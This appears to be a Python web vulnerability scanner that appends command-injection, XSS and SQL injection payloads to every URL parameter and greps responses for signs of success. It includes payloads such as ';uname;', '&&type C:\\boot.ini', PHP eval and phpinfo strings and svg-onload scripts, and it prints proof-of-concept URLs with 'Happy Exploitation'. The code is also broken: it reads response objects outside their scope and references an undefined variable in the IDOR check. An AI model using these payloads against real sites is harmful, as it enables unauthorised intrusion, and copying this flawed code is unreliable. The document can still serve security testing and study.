import urllib
import re 
from headers import *
from itertools import combinations 
from string import ascii_lowercase 

def main_function(url, payloads, check):
    with urlopen(Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'})) as opener:
        pass
    vuln = 0
    if opener.code == 999:
        print(" [~] WebKnight WAF Detected!")
        print(" [~] Delaying 3 seconds between every request")
        time.sleep(3)
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            #bugs = url.replace(sp, str(payload).strip())
            bugs = url.replace(params, params + str(payload).strip())
            try:
                with urlopen(Request(bugs, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'})) as request:
                    pass
            except Exception:
                continue
            html = request.readlines()
            for line in html:
                checker = re.findall(check, line)
                if len(checker) !=0:
                    print(" [*] Payload Found . . .")
                    print(f" [*] Payload: {payload}")
                    print(f" [!] Code Snippet: {line.strip()}")
                    print(f" [*] POC: {bugs}")
                    print(" [*] Happy Exploitation :D")
                    vuln +=1
    if vuln == 0:                
    	print(" [!] Target is not vulnerable!")
    else:
    	print(f" [!] Congratulations you've found {vuln} bugs :-) ")

def rce_func(url):
    headers_reader(url)
    print(" \n [!] Now Scanning for Remote Code/Command Execution ")
    print(" [!] Covering Linux & Windows Operating Systems ")
    print(" [!] Please wait ....")
    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    main_function(url, payloads, check)

def xss_func(url):
        print("\n [!] Now Scanning for XSS ")
        print(" [!] Please wait ....")  
        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
        check = re.compile('zigoo0<svg|x>x', re.I)
        main_function(url, payloads, check)

def error_based_sqli_func(url):
	print("\n [!] Now Scanning for Error Based SQL Injection ")
	print(" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases ")
	print(" [!] Please wait ....")
	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
	check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
	main_function(url, payloads, check)

def insecure_direct_obj_ref(url):
    print("\n [!] Now Scanning for Insecure Direct Object Reference ")
    print(" [!] Please wait ....")
    attackNumber = 1
    vuln = 0
    for i in range(5): 
         
        content = str(res.read()) 
        if content.find("You service") > 0: 
            vuln += 1
    if vuln == 0:                
        print(" [!] Target is not vulnerable!")
    else:
        print(f" [!] Congratulations you've found {vuln} bugs :-) ")
